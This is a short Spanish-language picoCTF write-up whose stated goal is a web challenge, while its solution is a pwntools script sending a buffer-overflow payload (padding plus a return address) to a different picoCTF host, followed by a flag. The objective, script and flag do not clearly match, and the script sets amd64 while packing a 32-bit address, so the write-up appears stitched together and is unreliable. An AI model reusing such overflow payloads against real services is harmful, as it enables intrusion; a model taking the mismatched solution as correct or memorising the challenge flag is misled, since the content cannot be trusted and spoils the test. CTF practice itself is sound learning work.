## Objetivos
Find the flag being held on this server to get ahead of the competition [http://mercury.picoctf.net:34561/](http://mercury.picoctf.net:34561/)
## Solucion
Se usara el mismo programa ya que son muy similares solo cambiaremos unas pequeñas cosas como en nc que nos proporcionan 

picoCTF{addr3ss3s_ar3_3asy_0195a40f}

crearemos un programa de python el cual realizara todas las operaciones que hariamosnosotros manualmente 
from pwn import *

#elf = context.binary = ELF("./vuln")
context.arch = 'amd64'
gs = '''
continue
'''

def start(server=True):
        if(server):
                return remote('saturn.picoctf.net', 61481)
        else:

                return process(['./vuln'])

io = start()

#io.recvuntil(">>")
a = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
a += "\xf6\x91\x04\x08"
io.sendline(a)

io.interactive()


## Referencias
[ayuda](https://github.com/LambdaMamba/CTFwriteups/tree/main/picoCTF_2022/Binary_Exploitation/buffer_overflow_1)
